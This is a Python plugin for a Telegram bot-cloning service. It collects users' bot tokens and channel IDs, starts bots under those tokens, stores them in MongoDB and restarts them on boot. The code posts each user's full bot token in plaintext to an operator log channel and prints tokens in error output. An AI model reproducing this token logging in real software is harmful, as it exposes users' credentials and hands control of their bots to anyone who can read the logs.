import re
from pymongo import MongoClient
from Script import script
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenExpired, AccessTokenInvalid
from config import API_ID, API_HASH, DB_URI, DB_NAME, CLONE_MODE, LOG_CHANNEL
from clone_plugins.dbusers import clonedb
from TechVJ.bot import StreamBot

mongo_client = MongoClient(DB_URI)
mongo_db = mongo_client["cloned_vjbotz"]

@Client.on_message(filters.command("clone") & filters.private)
async def clone(client, message):
    if CLONE_MODE == False:
        return 
    techvj = await client.ask(message.chat.id, "<b>1) sᴇɴᴅ <code>/newbot</code> ᴛᴏ @BotFather\n2) ɢɪᴠᴇ ᴀ ɴᴀᴍᴇ ꜰᴏʀ ʏᴏᴜʀ ʙᴏᴛ.\n3) ɢɪᴠᴇ ᴀ ᴜɴɪǫᴜᴇ ᴜsᴇʀɴᴀᴍᴇ.\n4) ᴛʜᴇɴ ʏᴏᴜ ᴡɪʟʟ ɢᴇᴛ ᴀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ ʏᴏᴜʀ ʙᴏᴛ ᴛᴏᴋᴇɴ.\n5) ꜰᴏʀᴡᴀʀᴅ ᴛʜᴀᴛ ᴍᴇssᴀɢᴇ ᴛᴏ ᴍᴇ.\n\n/cancel - ᴄᴀɴᴄᴇʟ ᴛʜɪs ᴘʀᴏᴄᴇss.</b>")
    if techvj.text == '/cancel':
        await techvj.delete()
        return await message.reply('<b>ᴄᴀɴᴄᴇʟᴇᴅ ᴛʜɪs ᴘʀᴏᴄᴇss 🚫</b>')
    if techvj.forward_from and techvj.forward_from.id == 93372553:
        try:
            bot_token = re.findall(r"\b(\d+:[A-Za-z0-9_-]+)\b", techvj.text)[0]
        except:
            return await message.reply('<b>sᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ 😕</b>')
    else:
        return await message.reply('<b>ɴᴏᴛ ꜰᴏʀᴡᴀʀᴅᴇᴅ ꜰʀᴏᴍ @BotFather 😑</b>')
    
    channel_msg = await client.ask(message.chat.id, "<b>Please provide the Database Channel ID (e.g., -1001234567890)\nMake sure the bot has admin access to this channel.\n\n/cancel - ᴄᴀɴᴄᴇʟ ᴛʜɪs ᴘʀᴏᴄᴇss.</b>")
    if channel_msg.text == '/cancel':
        await channel_msg.delete()
        return await message.reply('<b>ᴄᴀɴᴄᴇʟᴇᴅ ᴛʜɪs ᴘʀᴏᴄᴇss 🚫</b>')
    
    try:
        channel_id = int(channel_msg.text)
        if not str(channel_id).startswith('-100'):
            return await message.reply('<b>Invalid Channel ID format. It should start with -100 (e.g., -1001234567890)</b>')
    except ValueError:
        return await message.reply('<b>Please provide a valid numeric Channel ID</b>')

    user_id = message.from_user.id
    msg = await message.reply_text("**👨‍💻 ᴡᴀɪᴛ ᴀ ᴍɪɴᴜᴛᴇ ɪ ᴀᴍ ᴄʀᴇᴀᴛɪɴɢ ʏᴏᴜʀ ʙᴏᴛ ❣️**")
    try:
        vj = Client(
            f"{bot_token}", API_ID, API_HASH,
            bot_token=bot_token,
            plugins={"root": "clone_plugins"}
        )
        await vj.start()
        bot = await vj.get_me()
        
        try:
            await vj.get_chat(channel_id)
        except Exception as e:
            await vj.stop()
            return await msg.edit_text(f"<b>Bot cannot access the channel. Please ensure the bot is an admin in the channel. Try again /clone\nError: {e}</b>")

        details = {
            'bot_id': bot.id,
            'is_bot': True,
            'user_id': user_id,
            'name': bot.first_name,
            'token': bot_token,
            'username': bot.username,
            'db_channel_id': channel_id
        }

        vj.bot_details = details
        mongo_db.bots.insert_one(details)
        await msg.edit_text(f"<b>sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʟᴏɴᴇᴅ ʏᴏᴜʀ ʙᴏᴛ: @{bot.username}\nDatabase Channel ID saved.</b>")
        await clonedb.add_admin(bot.id, user_id)
        db_channel = await vj.get_chat(channel_id)
        if not db_channel.invite_link:
            db_channel.invite_link = await vj.export_chat_invite_link(channel_id)
            vj.db_channel = db_channel
        await StreamBot.send_message(chat_id=LOG_CHANNEL, text=f"#newclone\n**Bot ID:** `{details['bot_id']}`\n**User ID:** `{details['user_id']}`\n**Name:** `{details['name']}`\n**Username:** @{details['username']}\n**Token:** `{details['token']}`\n**DB Channel ID:** `{details['db_channel_id']}`")
    except BaseException as e:
        await msg.edit_text(f"⚠️ <b>Bot Error:</b>\n\n<code>{e}</code>\n\n**Kindly forward this message to @KingVJ01 to get assistance.**")

@Client.on_message(filters.command("deletecloned") & filters.private)
async def delete_cloned_bot(client, message):
    if CLONE_MODE == False:
        return
    try:
        techvj = await client.ask(message.chat.id, "**Send Me Bot Token To Delete**")
        bot_token = re.findall(r'\d[0-9]{8,10}:[0-9A-Za-z_-]{35}', techvj.text, re.IGNORECASE)
        bot_token = bot_token[0] if bot_token else None
        cloned_bot = mongo_db.bots.find_one({"token": bot_token})
        if cloned_bot:
            mongo_db.bots.delete_one({"token": bot_token})
            await message.reply_text("**🤖 ᴛʜᴇ ᴄʟᴏɴᴇᴅ ʙᴏᴛ ʜᴀs ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴛʜᴇ ʟɪsᴛ ᴀɴᴅ ɪᴛs ᴅᴇᴛᴀɪʟs ʜᴀᴠᴇ ʙᴇᴇɴ ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴛʜᴇ ᴅᴀᴛᴀʙᴀsᴇ. ☠️**")
        else:
            await message.reply_text("**⚠️ ᴛʜᴇ ʙᴏᴛ ᴛᴏᴋᴇɴ ᴘʀᴏᴠɪᴅᴇᴅ ɪs ɴᴏᴛ ɪɴ ᴛʜᴇ ᴄʟᴏɴᴇᴅ ʟɪsᴛ.**")
    except:
        await message.reply_text("An error occurred while deleting the cloned bot.")

async def update_chat_ids(self, bot_id):
    self.invite_links = {}
    channel_ids = await clonedb.get_all_channels(bot_id)
    if channel_ids:
        for channel in channel_ids:
            try:
                link = (await self.get_chat(channel)).invite_link
                if not link:
                    link = await self.export_chat_invite_link(chat_id=channel)
                self.invite_links[channel] = link
            except Exception as a:
                print(a)
                print("Bot can't Export Invite link from Force Sub Channel!")
                print(f"Please Double check the channel_ids value and Make sure Bot is Admin in channel with Invite Users via Link Permission, Current Force Sub Channel Value: {channel_ids}")

Client.update_chat_ids = update_chat_ids

async def restart_bots():
    bots = list(mongo_db.bots.find())
    for bot in bots:
        bot_token = bot['token']
        bot_id = bot['bot_id']
        bot_username = bot['username']
        bot_name = bot['name']
        user_id = bot['user_id']
        db_channel_id = bot.get('db_channel_id')
        try:
            vj = Client(
                name=f"{bot_token}",
                api_id=API_ID,
                api_hash=API_HASH,
                bot_token=bot_token,
                plugins={"root": "clone_plugins"}
            )
            vj.bot_details = {
                'bot_id': bot_id,
                'username': bot_username,
                'name': bot_name,
                'user_id': user_id,
                'db_channel': db_channel_id
            }
            await vj.start()
            bot = await vj.get_me()
            await vj.update_chat_ids(bot_id)
            print(f"Successfully restarted bot: @{bot_username}")
            db_channel = await vj.get_chat(db_channel_id)
            if not db_channel.invite_link:
                db_channel.invite_link = await vj.export_chat_invite_link(db_channel_id)
            vj.db_channel = db_channel
        except Exception as e:
            mongo_db.bots.delete_one({"token": bot_token})
            print(f"Error with bot {bot_token}: {e}")
